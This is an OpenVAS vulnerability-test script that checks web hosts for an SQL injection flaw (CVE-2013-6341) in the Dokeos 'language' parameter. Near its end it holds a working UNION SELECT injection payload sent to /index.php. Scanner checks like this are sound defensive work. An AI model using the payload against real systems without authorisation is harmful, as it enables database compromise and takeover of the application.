###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_dokeos_sql_inj_vuln.nasl 11096 2018-08-23 12:49:10Z mmartin $
#
# Dokeos 'language' Parameter SQL Injection Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2013 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:dokeos:dokeos';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.903415");
  script_version("$Revision: 11096 $");
  script_cve_id("CVE-2013-6341");
  script_bugtraq_id(63461);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-08-23 14:49:10 +0200 (Thu, 23 Aug 2018) $");
  script_tag(name:"creation_date", value:"2013-11-28 14:52:35 +0530 (Thu, 28 Nov 2013)");
  script_name("Dokeos 'language' Parameter SQL Injection Vulnerability");

  script_tag(name:"summary", value:"This host is running Dokeos and is prone to SQL injection vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted exploit string via HTTP GET request and check whether it
is possible to execute sql query.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"insight", value:"The flaw is due to insufficient validation of 'language' HTTP GET parameter
passed to '/index.php' script.");

  script_tag(name:"affected", value:"Dokeos versions 2.2 RC2 and probably prior.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary SQL
commands in applications database and gain complete control over the vulnerable web application.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  script_xref(name:"URL", value:"https://www.htbridge.com/advisory/HTB23181");
  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/dokeos-22-rc2-sql-injection");

  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 SecPod");
  script_dependencies("dokeos_detect.nasl");
  script_mandatory_keys("dokeos/installed");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!dir = get_app_location(cpe: CPE, port: port))
  exit(0);

url = dir + "/index.php?language=0%27%20UNION%20SELECT%201,2,3," +
            "0x673716C2D696E6A656374696F6E2D74657374,version%28%29,6,7,8%20--%202)";

if (http_vuln_check(port: port, url: url, check_header: TRUE, pattern: "sql-injection-test",
                    extra_check:make_list('www.dokeos.com', 'Dokeos'))) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
